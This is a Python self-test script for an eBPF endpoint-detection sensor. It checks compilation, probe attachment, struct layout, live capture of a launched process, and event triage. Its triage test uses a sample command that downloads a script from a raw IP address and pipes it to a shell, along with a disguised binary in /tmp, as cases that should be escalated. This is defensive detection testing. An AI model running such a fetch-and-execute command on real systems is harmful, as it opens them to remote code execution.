#!/usr/bin/env python3
"""Comprueba el sensor entero sin arrancar el sistema.

    sudo venv/bin/python3 scripts/check_sensor.py

Existe porque un error de sintaxis en C, o un rechazo del verificador de eBPF, no
se puede detectar sin root: BCC necesita las cabeceras del kernel y las obtiene
cargando el módulo `kheaders`, cosa que requiere privilegios. Sin esto, el único
modo de descubrir un fallo en el C sería una ejecución completa del sistema, que
mezcla ese fallo con los de todo lo demás.

Comprueba cinco cosas en una sola ejecución privilegiada, que es lo que hace
barato iterar sobre el programa en C:

1. Compila y el verificador lo acepta.
2. Las sondas se enganchan (un símbolo puede faltar aunque el programa sea válido).
3. El espejo de ctypes cuadra con las structs de C.
4. **Captura de verdad**: lanza un proceso conocido y lee sus eventos.
5. El triaje puntúa esos eventos como se espera.

Los puntos 4 y 5 son los que distinguen "el programa carga" de "el sensor
funciona". Una struct desalineada compila y engancha perfectamente, y lo único
que delata el fallo es leer un evento real y ver salir basura.

Devuelve 0 si todo pasa; 1 en cuanto algo falla.
"""

import ctypes as ct
import os
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import forensic_mcp  # noqa: E402
from edr import procinfo, triage  # noqa: E402
from edr.eventstore import EventStore  # noqa: E402

# Orden que se lanza para provocar un evento.
#
# Tres propiedades buscadas a propósito:
#   - Argumentos reconocibles: si el desplazamiento de `args` estuviera mal,
#     saldría basura en su lugar y se vería a simple vista.
#   - Uno de ellos lleva un espacio ("mundo raro"): demuestra que los argumentos
#     se separan por el '\0' que escribe la sonda y no partiendo por espacios.
#   - El proceso dura un segundo, así que sigue vivo mientras se sondea. Hace
#     falta para comprobar el ppid, que se resuelve leyendo /proc.
ORDEN = ["/bin/sh", "-c", "sleep 1", "marcador", "mundo raro"]
ESPERADO = "-c sleep 1 marcador mundo raro"


def compilar():
    lineas = forensic_mcp.ebpf_code.count("\n")
    print(f"[*] Compilando el programa eBPF ({lineas} líneas de C)…")
    try:
        from bcc import BPF
        bpf = BPF(text=forensic_mcp.ebpf_code)
    except Exception as e:  # noqa: BLE001
        print("\n[FALLO] el programa no compila o el verificador lo rechaza:\n")
        print(str(e)[:4000])
        return None
    print("[ OK ] compila, carga y pasa el verificador.")
    return bpf


def enganchar(bpf):
    print("\n[*] Enganchando sondas…")
    ok = True
    for syscall in ("finit_module", "init_module"):
        try:
            fnname = bpf.get_syscall_fnname(syscall)
            bpf.attach_kprobe(event=fnname, fn_name="kprobe_module_load")
            print(f"  [ OK ] kprobe:{syscall}  ({fnname.decode()})")
        except Exception as e:  # noqa: BLE001
            print(f"  [FALLO] kprobe:{syscall}: {e}")
            ok = False
    # El tracepoint de execve lo declara la macro TRACEPOINT_PROBE, que lo engancha
    # sola al cargar el programa: no aparece aquí porque no hay nada que enganchar.
    print("  [ OK ] tracepoint:sys_enter_execve (automático, vía TRACEPOINT_PROBE)")
    return ok


def comprobar_ctypes():
    print("\n[*] Espejo de ctypes…")
    esperados = {"EvHdr": 64, "ModuleEvent": 64, "ExecEvent": 528}
    ok = True
    for nombre, tam in esperados.items():
        real = ct.sizeof(getattr(forensic_mcp, nombre))
        marca = " OK " if real == tam else "FALLO"
        if real != tam:
            ok = False
        print(f"  [{marca}] sizeof({nombre}) = {real} (esperado {tam})")

    for campo, off in (("hdr", 0), ("filename", 64), ("args", 192),
                       ("args_len", 512)):
        real = getattr(forensic_mcp.ExecEvent, campo).offset
        marca = " OK " if real == off else "FALLO"
        if real != off:
            ok = False
        print(f"  [{marca}] ExecEvent.{campo} en el byte {real} (esperado {off})")
    return ok


def _lanzar():
    """Ejecuta la orden con un fork explícito y devuelve el PID del hijo.

    Se hace a mano en vez de con `subprocess.run` para saber con certeza qué PID
    buscar y quién es su padre. Con `subprocess` no se sabe: CPython puede usar
    `posix_spawn`, y en esta máquina el proceso resultante apareció colgando de un
    intermediario, no del script.

    No se espera al hijo aquí: tiene que seguir vivo mientras se sondea el ring
    buffer, porque el `ppid` se resuelve leyendo su /proc.
    """
    pid = os.fork()
    if pid == 0:
        try:
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, 1)
            os.execv(ORDEN[0], ORDEN)
        finally:
            os._exit(127)   # solo se llega aquí si execv falló
    return pid


def capturar(bpf):
    """Lanza una orden conocida y comprueba que el evento llega íntegro.

    Se invoca `handle_event`, la misma función que usa el sistema en marcha, y se
    mira lo que deja en el almacén. Duplicar aquí la extracción de campos haría
    que la comprobación pasara mientras la ruta real está rota — que es justo lo
    que pasó con el `ppid` al moverlo de la sonda a userspace.
    """
    print(f"\n[*] Captura en vivo: {' '.join(ORDEN)}")

    almacen = EventStore(None, cap=500)
    forensic_mcp.STORE = almacen

    bpf["events"].open_ring_buffer(
        lambda ctx, data, size: forensic_mcp.handle_event(data, size))

    hijo = _lanzar()

    # Se sondea mientras el hijo sigue vivo: el evento llega de inmediato, pero
    # el ppid se lee de /proc y para eso el proceso tiene que existir todavía.
    limite = time.monotonic() + 0.8
    while time.monotonic() < limite:
        bpf.ring_buffer_poll(50)

    # El starttime de /proc se lee AQUÍ, con el proceso todavía vivo: después del
    # waitpid ya ha sido recogido y su /proc no existe.
    starttime_proc = procinfo.starttime(hijo)
    os.waitpid(hijo, 0)

    # Se busca por PID exacto: es el único evento que con seguridad es el nuestro.
    nuestro = [e for e in almacen.query(limit=0) if e.get("pid") == hijo]
    if not nuestro:
        total = len(almacen.query(limit=0))
        print(f"  [FALLO] no llegó el evento del PID {hijo} "
              f"({total} eventos capturados en total)")
        return False

    ev = nuestro[-1]
    print(f"  evento: pid={ev['pid']} ppid={ev['ppid']} uid={ev['uid']} "
          f"caller_comm={ev.get('caller_comm')}")
    print(f"  filename: {ev['filename']}")
    print(f"  cmdline:  {ev['cmdline']!r}")

    ok = True

    def comprobar(condicion, bien, mal):
        nonlocal ok
        if condicion:
            print(f"  [ OK ] {bien}")
        else:
            print(f"  [FALLO] {mal}")
            ok = False

    comprobar(ev["cmdline"] == ESPERADO,
              "la línea de órdenes llega completa, en orden y con los espacios",
              f"línea de órdenes inesperada: se esperaba {ESPERADO!r}")

    # La identidad es el logro de la fase 3a: si volviera a cero, se habría roto.
    comprobar(bool(ev["starttime"]),
              f"identidad capturada en la sonda (starttime={ev['starttime']})",
              "starttime vacío: se perdió la captura de identidad")

    comprobar(ev["ppid"] == os.getpid(),
              "el ppid apunta al proceso que lanzó la orden",
              f"el ppid debería ser el de este script ({os.getpid()}) "
              f"y es {ev['ppid']}")

    comprobar(ev["filename"] == ORDEN[0],
              f"filename correcto ({ev['filename']})",
              f"filename inesperado: {ev['filename']}")

    # La comprobación decisiva en esta máquina: el PID tiene que estar en la
    # numeración que ve /proc, no en la del namespace inicial del kernel.
    comprobar(not ev["foreign_ns"],
              "el PID está en la numeración de /proc, no en la global",
              "el PID no se tradujo al namespace del EDR")

    # Y la prueba definitiva de que ese PID significa algo aquí: el starttime que
    # capturó la sonda tiene que coincidir con el que /proc reporta para ese PID.
    # Es exactamente la comprobación de la que depende toda la remediación.
    comprobar(starttime_proc is not None and starttime_proc == ev["starttime"],
              "el starttime coincide con /proc: la salvaguarda anti-reutilización "
              "de PID puede funcionar",
              f"el starttime de la sonda ({ev['starttime']}) no coincide con el "
              f"de /proc ({starttime_proc})")

    return ok


def comprobar_namespace():
    """Avisa si el EDR corre dentro de un namespace de PIDs anidado.

    No es un fallo —el sensor lo traduce— pero conviene que quede en la salida:
    es la diferencia entre esta máquina y la VM del laboratorio de la fase 7, y
    explica por qué el sensor necesita el helper de traducción.
    """
    NS_INICIAL = 4026531836   # inodo fijo del namespace de PIDs inicial
    st = os.stat("/proc/self/ns/pid")

    print("\n[*] Namespace de PIDs…")
    if st.st_ino == NS_INICIAL:
        print("  [ OK ] el EDR corre en el namespace inicial del kernel")
    else:
        print(f"  [nota] namespace anidado (inodo {st.st_ino}, el inicial es "
              f"{NS_INICIAL})")
        print("         los PIDs se traducen en la sonda; sin eso, /proc y las "
              "salvaguardas leerían otro proceso")
    return True


def comprobar_triaje():
    """El triaje debe distinguir las dos órdenes de la demo."""
    print("\n[*] Triaje sobre eventos de ejemplo…")
    casos = [
        ({"filename": "/usr/bin/curl",
          "cmdline": "-s https://api.github.com/health"}, False),
        ({"filename": "/usr/bin/curl",
          "cmdline": "-s http://45.33.0.1/x.sh | sh"}, True),
        ({"filename": "/tmp/.systemd-update", "cmdline": "600"}, True),
    ]
    ok = True
    for evento, debe_escalar in casos:
        severidad, reglas = triage.assess(evento)
        escala = triage.should_escalate(evento)
        marca = " OK " if escala == debe_escalar else "FALLO"
        if escala != debe_escalar:
            ok = False
        print(f"  [{marca}] {evento['filename']} {evento['cmdline'][:40]!r} → "
              f"severidad={severidad} reglas={reglas or '-'}")
    return ok


def main():
    if os.geteuid() != 0:
        print("[!] Necesita root: BCC carga el módulo kheaders para compilar.")
        print("    sudo venv/bin/python3 scripts/check_sensor.py")
        return 1

    bpf = compilar()
    if bpf is None:
        return 1

    pasos = [
        enganchar(bpf),
        comprobar_ctypes(),
        comprobar_namespace(),
        capturar(bpf),
        comprobar_triaje(),
    ]

    if all(pasos):
        print("\n[+] Todo correcto. Puedes arrancar el sistema.")
        return 0
    print("\n[-] Hay comprobaciones en fallo, revisa la salida de arriba.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
